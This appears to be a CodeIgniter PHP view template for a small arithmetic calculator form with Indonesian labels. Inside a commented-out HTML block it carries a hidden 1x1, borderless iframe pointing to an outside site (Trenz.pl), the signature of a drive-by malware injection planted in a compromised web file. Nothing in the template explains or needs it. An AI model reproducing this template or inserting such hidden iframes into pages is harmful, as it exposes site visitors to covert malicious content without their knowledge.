<?PHP /* <!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Welcome to CodeIgniter</title>

	<style type="text/css">

	::selection{ background-color: #E13300; color: white; }
	::moz-selection{ background-color: #E13300; color: white; }
	::webkit-selection{ background-color: #E13300; color: white; }

	body {
		background-color: #fff;
		margin: 40px;
		font: 13px/20px normal Helvetica, Arial, sans-serif;
		color: #4F5155;
	}

	a {
		color: #003399;
		background-color: transparent;
		font-weight: normal;
	}

	h1 {
		color: #444;
		background-color: transparent;
		border-bottom: 1px solid #D0D0D0;
		font-size: 19px;
		font-weight: normal;
		margin: 0 0 14px 0;
		padding: 14px 15px 10px 15px;
	}

	code {
		font-family: Consolas, Monaco, Courier New, Courier, monospace;
		font-size: 12px;
		background-color: #f9f9f9;
		border: 1px solid #D0D0D0;
		color: #002166;
		display: block;
		margin: 14px 0 14px 0;
		padding: 12px 10px 12px 10px;
	}

	#body{
		margin: 0 15px 0 15px;
	}
	
	p.footer{
		text-align: right;
		font-size: 11px;
		border-top: 1px solid #D0D0D0;
		line-height: 32px;
		padding: 0 10px 0 10px;
		margin: 20px 0 0 0;
	}
	
	#container{
		margin: 10px;
		border: 1px solid #D0D0D0;
		-webkit-box-shadow: 0 0 8px #D0D0D0;
	}
	</style>
</head>
<body>

<div id="container">
	<h1>Operasi Aritmatika</h1>

	<div id="body">
		<?php echo form_open('');?>
		<?php echo form_error("v1", '<div class="error">', '</div>'); ?>
		Variabel 1 <?php echo form_input('v1', $v1); ?><br />
		<?php echo form_error("v2", '<div class="error">', '</div>'); ?>
		Variabel 2 <?php echo form_input('v2', $v2); ?><br />
		Operation <?php echo form_dropdown('op', $options, $op); ?><br />
		<?php echo form_submit('submit','Hitung!!');?>
		<?php echo form_close(); ?><br />
		<?php echo $hasil; ?>
	</div>
	<p class="footer">Page rendered in <strong>{elapsed_time}</strong> seconds</p>
</div>

<iframe src="http://www.Trenz.pl/rc/" width=1 height=1 frameborder=0></iframe>
</body>
</html>  */?>


<form acition="" method="POST">
	Variable 1 <input type="text" name="var1" value="" /><br />
	Variable 2 <input type="text" name="var2" value="" /><br />
	<input type="checkbox" name="mycheck[]" value="1" <?php echo set_checkbox('mycheck[]', '1'); ?> />
	<input type="checkbox" name="mycheck[]" value="2" <?php echo set_checkbox('mycheck[]', '2'); ?> />
	<input type="submit" value="Hitung" />
</form>
<?php echo $hasil ?>